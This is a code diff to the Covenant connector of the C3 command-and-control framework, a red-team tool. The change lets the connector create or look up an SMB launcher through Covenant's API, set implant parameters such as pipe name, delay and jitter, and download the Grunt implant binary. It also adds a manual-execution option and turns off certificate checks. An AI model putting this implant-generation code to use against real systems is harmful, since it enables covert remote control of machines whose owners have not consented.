@@ -92,7 +92,7 @@ namespace FSecure::C3::Interfaces::Connectors
 		/// @param jitter percent to jitter the delay by
 		/// @param listenerId the id of the Bridge listener for covenant
 		/// @return generated payload.
-		FSecure::ByteVector GeneratePayload(ByteView binderId, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t connectAttempts);
+		FSecure::ByteVector GeneratePayload(ByteView binderId, std::string manualExecution, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t connectAttempts);
 
 		/// Close desired connection
 		/// @arguments arguments for command. connection Id in string form.
@@ -128,6 +128,8 @@ namespace FSecure::C3::Interfaces::Connectors
 		///member for listener
 		int m_ListenerId;
 
+		int m_LauncherId;
+
 		/// Access mutex for m_ConnectionMap.
 		std::mutex m_ConnectionMapAccess;
 
@@ -138,6 +140,8 @@ namespace FSecure::C3::Interfaces::Connectors
 		std::unordered_map<std::string, std::shared_ptr<Connection>> m_ConnectionMap;
 
 		bool UpdateListenerId();
+
+		bool UpdateLauncherId();
 	};
 }
 
@@ -180,6 +184,45 @@ bool FSecure::C3::Interfaces::Connectors::Covenant::UpdateListenerId()
 	}
 
 	return false; //we didn't find the listener
+}
+
+bool FSecure::C3::Interfaces::Connectors::Covenant::UpdateLauncherId()
+{
+	std::string url = this->m_webHost + OBF("/api/launchers");
+	std::pair<std::string, uint16_t> data;
+	json response;
+
+	web::http::client::http_client_config config;
+	config.set_validate_certificates(false); //Covenant framework is unlikely to have a valid cert.
+
+	web::http::client::http_client webClient(utility::conversions::to_string_t(url), config);
+	web::http::http_request request;
+
+	request = web::http::http_request(web::http::methods::GET);
+
+	std::string authHeader = OBF("Bearer ") + this->m_token;
+	request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
+	pplx::task<web::http::http_response> task = webClient.request(request);
+
+	web::http::http_response resp = task.get();
+
+	if (resp.status_code() != web::http::status_codes::OK)
+		throw std::exception((OBF("[Covenant] Error getting Launchers, HTTP resp: ") + std::to_string(resp.status_code())).c_str());
+
+	//Get the json response
+	auto respData = resp.extract_string();
+	response = json::parse(respData.get());
+
+	for (auto& launchers : response)
+	{
+		if (launchers[OBF("name")] != OBF("C3SMB"))
+			continue;
+
+		this->m_LauncherId = launchers[OBF("id")].get<int>();
+		return true;
+	}
+
+	return false; //we didn't find the launcher
 }
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -318,56 +361,91 @@ bool FSecure::C3::Interfaces::Connectors::Covenant::DeinitializeSockets()
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::GeneratePayload(ByteView binderId, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t connectAttempts)
+FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::GeneratePayload(ByteView binderId, std::string manualExecution, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t connectAttempts)
 {
 	if (binderId.empty() || pipename.empty())
 		throw std::runtime_error{ OBF("Wrong parameters, cannot create payload") };
 
+	if ("true" == manualExecution)
+	{
+		auto connection = std::make_shared<Connection>(m_ListeningPostAddress, m_ListeningPostPort, std::static_pointer_cast<Covenant>(shared_from_this()), binderId);
+		m_ConnectionMap.emplace(std::string{ binderId }, std::move(connection));
+		return ByteVector();
+	}
+
 	std::string authHeader = OBF("Bearer ") + this->m_token;
 	std::string contentHeader = OBF("Content-Type: application/json");
-	std::string binary;
+	//std::string binary;
+	FSecure::ByteVector::Super binary;
 
+	
 	web::http::client::http_client_config config;
 	config.set_validate_certificates(false);
 	web::http::client::http_client webClient(utility::conversions::to_string_t(this->m_webHost + OBF("/api/launchers/binary")), config);
 	web::http::http_request request;
+	pplx::task<web::http::http_response> task;
+	web::http::http_response resp;
 
+	request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
+	request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
 	//The data to create an SMB Grunt
+	// Update Grunt data to current
 	json postData;
-	postData[OBF("id")] = this->m_ListenerId;
-	postData[OBF("smbPipeName")] = pipename;
 	postData[OBF("listenerId")] = this->m_ListenerId;
-	postData[OBF("outputKind")] = OBF("ConsoleApplication");
-	postData[OBF("implantTemplateId")] = 2; //for GruntSMB template
-	postData[OBF("dotNetFrameworkVersion")] = OBF("Net40");
-	postData[OBF("type")] = OBF("Wmic");
+	postData[OBF("implantTemplateId")] = 4; //for GruntSMB template
+	postData[OBF("Name")] = OBF("C3SMB");
+	postData[OBF("description")] = OBF("A SMB Launcher for C3Bridge Listener.");
+	postData[OBF("type")] = OBF("Binary");
+	postData[OBF("dotNetVersion")] = OBF("Net40");
+	postData[OBF("smbPipeName")] = pipename;
 	postData[OBF("delay")] = delay;
 	postData[OBF("jitterPercent")] = jitter;
 	postData[OBF("connectAttempts")] = connectAttempts;
+	//postData[OBF("outputKind")] = OBF("ConsoleApplication");
+	
+	if (!UpdateLauncherId())
+	{
+		///	Create Launcher if it doesn't exists
 
-	//First we use a PUT to add our data as the template.
-	request = web::http::http_request(web::http::methods::PUT);
+		request.set_method(web::http::methods::POST);
+		request.set_body(utility::conversions::to_string_t(postData.dump()));
+
+		task = webClient.request(request);
+		resp = task.get();
+
+		if (resp.status_code() != web::http::status_codes::OK)
+			throw std::exception((OBF("[Covenant] Error setting up Launcher, HTTP resp: ") + std::to_string(resp.status_code())).c_str());
+
+		if (!UpdateLauncherId()) //now get the id of the launcher
+			throw std::exception((OBF("[Covenant] Error getting LauncherID after creation")));
+	}
+
+	// Update postData to relevant launcher
+	postData[OBF("id")] = this->m_LauncherId;
+
 	try
 	{
+		// Update launcher details.
+		request.set_method(web::http::methods::PUT);
 		request.headers().set_content_type(utility::conversions::to_string_t("application/json"));
 		request.set_body(utility::conversions::to_string_t(postData.dump()));
 
-		request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
-		pplx::task<web::http::http_response> task = webClient.request(request);
-		web::http::http_response resp = task.get();
+		task = webClient.request(request);
+		resp = task.get();
 
 		//If we get 200 OK, then we use a POST to request the generation of the payload. We can reuse the previous data here.
 		if (resp.status_code() == web::http::status_codes::OK)
 		{
-			request.set_method(web::http::methods::POST);
+			web::http::client::http_client webClient(utility::conversions::to_string_t(this->m_webHost + OBF("/api/launchers/") + std::to_string(this->m_LauncherId) + OBF("/download")), config);
+			request.set_method(web::http::methods::GET);
+			request.headers().set_content_type(utility::conversions::to_string_t("application/octet-stream"));
 			task = webClient.request(request);
 			resp = task.get();
 
 			if (resp.status_code() == web::http::status_codes::OK)
 			{
-				auto respData = resp.extract_string();
-				json resp = json::parse(respData.get());
-				binary = resp[OBF("base64ILByteString")].get<std::string>(); //Contains the base64 encoded .NET assembly.
+				auto respData = resp.extract_vector();
+				binary = respData.get();
 			}
 			else
 				throw std::runtime_error(OBF("[Covenant] Non-200 HTTP code returned: ") + std::to_string(resp.status_code()));
@@ -375,7 +453,7 @@ FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::GeneratePaylo
 		else
 			throw std::runtime_error(OBF("[Covenant] Non-200 HTTP code returned: ") + std::to_string(resp.status_code()));
 
-		auto payload = cppcodec::base64_rfc4648::decode(binary);
+		auto payload = binary;
 
 		//Finally connect to the socket.
 		auto connection = std::make_shared<Connection>(m_ListeningPostAddress, m_ListeningPostPort, std::static_pointer_cast<Covenant>(shared_from_this()), binderId);
@@ -596,7 +674,7 @@ FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::PeripheralCre
 	auto [manualExecution, pipeName, delay, jitter, connectAttempts] = data.Read<std::string, std::string, uint32_t, uint32_t, uint32_t>();
 
 
-	return ByteVector{}.Write(manualExecution, pipeName, GeneratePayload(connectionId, pipeName, delay, jitter, connectAttempts), connectAttempts);
+	return ByteVector{}.Write(manualExecution, pipeName, GeneratePayload(connectionId, manualExecution, pipeName, delay, jitter, connectAttempts), connectAttempts);
 }
 
 
